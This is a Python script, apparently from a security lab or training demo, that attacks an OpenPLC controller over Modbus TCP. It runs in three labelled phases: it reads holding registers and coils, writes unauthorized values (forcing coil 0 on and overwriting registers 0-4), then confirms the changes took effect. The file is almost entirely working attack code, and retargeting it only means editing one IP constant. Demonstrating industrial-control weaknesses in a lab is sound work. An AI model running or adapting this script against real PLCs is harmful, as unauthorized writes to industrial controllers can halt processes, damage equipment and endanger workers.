"""
Modbus TCP Attack Demo Script
Target: OpenPLC at localhost:502 (192.168.200.3 internally)

This script demonstrates:
1. Reconnaissance - Reading Modbus registers
2. Exploitation - Writing malicious values to coils/registers
3. Impact - Showing unauthorized control of industrial process

Usage: python modbus_attack_demo.py
"""

try:
    from pymodbus.client import ModbusTcpClient
    from pymodbus.exceptions import ModbusException
except ImportError:
    print("[!] pymodbus not installed. Install with: pip install pymodbus")
    print("[!] For demo purposes, showing what the attack would do...")
    exit(1)

import time

# Target configuration
TARGET_IP = "localhost"  # or 192.168.200.3 from Kali
TARGET_PORT = 502
UNIT_ID = 1

def banner():
    print("=" * 60)
    print("  MODBUS TCP ATTACK DEMONSTRATION")
    print("  Target: OpenPLC Runtime")
    print("  Protocol: Modbus TCP (Port 502)")
    print("=" * 60)
    print()

def reconnaissance(client):
    """Phase 1: Reconnaissance - Read current state"""
    print("[*] PHASE 1: RECONNAISSANCE")
    print("[*] Reading Modbus registers to understand the system...")
    print()
    
    try:
        # Read holding registers (address 0-10)
        print("[+] Reading Holding Registers (0-10):")
        result = client.read_holding_registers(address=0, count=10, unit=UNIT_ID)
        if not result.isError():
            for i, value in enumerate(result.registers):
                print(f"    Register {i}: {value}")
        else:
            print(f"    [!] Error reading registers: {result}")
        
        print()
        
        # Read coils (digital outputs)
        print("[+] Reading Coils (0-10):")
        result = client.read_coils(address=0, count=10, unit=UNIT_ID)
        if not result.isError():
            for i, value in enumerate(result.bits[:10]):
                status = "ON" if value else "OFF"
                print(f"    Coil {i}: {status}")
        else:
            print(f"    [!] Error reading coils: {result}")
        
        print()
        print("[✓] Reconnaissance complete - System state captured")
        print()
        
    except Exception as e:
        print(f"[!] Reconnaissance failed: {e}")

def exploitation(client):
    """Phase 2: Exploitation - Write malicious values"""
    print("[*] PHASE 2: EXPLOITATION")
    print("[*] Writing unauthorized values to control system...")
    print()
    
    try:
        # Attack 1: Write to coil (digital output)
        print("[!] Attack 1: Forcing Coil 0 to ON (Emergency Stop)")
        result = client.write_coil(address=0, value=True, unit=UNIT_ID)
        if not result.isError():
            print("[✓] Coil 0 set to ON - Emergency stop triggered!")
        else:
            print(f"[!] Failed to write coil: {result}")
        
        time.sleep(1)
        
        # Attack 2: Write to holding register
        print("[!] Attack 2: Writing malicious value to Register 0")
        result = client.write_register(address=0, value=9999, unit=UNIT_ID)
        if not result.isError():
            print("[✓] Register 0 set to 9999 - Setpoint manipulated!")
        else:
            print(f"[!] Failed to write register: {result}")
        
        time.sleep(1)
        
        # Attack 3: Write multiple registers
        print("[!] Attack 3: Writing multiple registers (0-4)")
        values = [8888, 7777, 6666, 5555, 4444]
        result = client.write_registers(address=0, values=values, unit=UNIT_ID)
        if not result.isError():
            print(f"[✓] Registers 0-4 overwritten with: {values}")
        else:
            print(f"[!] Failed to write registers: {result}")
        
        print()
        print("[✓] Exploitation complete - System compromised")
        print()
        
    except Exception as e:
        print(f"[!] Exploitation failed: {e}")

def verify_impact(client):
    """Phase 3: Verify Impact - Read modified values"""
    print("[*] PHASE 3: IMPACT VERIFICATION")
    print("[*] Reading modified values to confirm attack success...")
    print()
    
    try:
        # Verify coil changes
        print("[+] Verifying Coil 0:")
        result = client.read_coils(address=0, count=1, unit=UNIT_ID)
        if not result.isError():
            status = "ON (ATTACKED)" if result.bits[0] else "OFF"
            print(f"    Coil 0: {status}")
        
        # Verify register changes
        print("[+] Verifying Registers (0-4):")
        result = client.read_holding_registers(address=0, count=5, unit=UNIT_ID)
        if not result.isError():
            for i, value in enumerate(result.registers):
                print(f"    Register {i}: {value} {'(MODIFIED)' if value > 1000 else ''}")
        
        print()
        print("[✓] Impact verified - Unauthorized control achieved")
        print()
        
    except Exception as e:
        print(f"[!] Verification failed: {e}")

def main():
    banner()
    
    print(f"[*] Connecting to {TARGET_IP}:{TARGET_PORT}...")
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT, timeout=3)
    
    if not client.connect():
        print(f"[!] Failed to connect to {TARGET_IP}:{TARGET_PORT}")
        print("[!] Make sure OpenPLC is running: docker ps | grep openplc")
        return
    
    print(f"[✓] Connected to Modbus server at {TARGET_IP}:{TARGET_PORT}")
    print()
    
    try:
        # Execute attack phases
        reconnaissance(client)
        time.sleep(2)
        
        exploitation(client)
        time.sleep(2)
        
        verify_impact(client)
        
        # Summary
        print("=" * 60)
        print("  ATTACK SUMMARY")
        print("=" * 60)
        print("[✓] Reconnaissance: System state captured")
        print("[✓] Exploitation: Unauthorized writes successful")
        print("[✓] Impact: Industrial process compromised")
        print()
        print("[!] DEMONSTRATION COMPLETE")
        print("[!] In a real scenario, this could:")
        print("    - Stop production lines")
        print("    - Damage equipment")
        print("    - Create safety hazards")
        print("    - Cause financial losses")
        print()
        print("=" * 60)
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"[!] Attack failed: {e}")
    finally:
        client.close()
        print("[*] Connection closed")

if __name__ == "__main__":
    main()
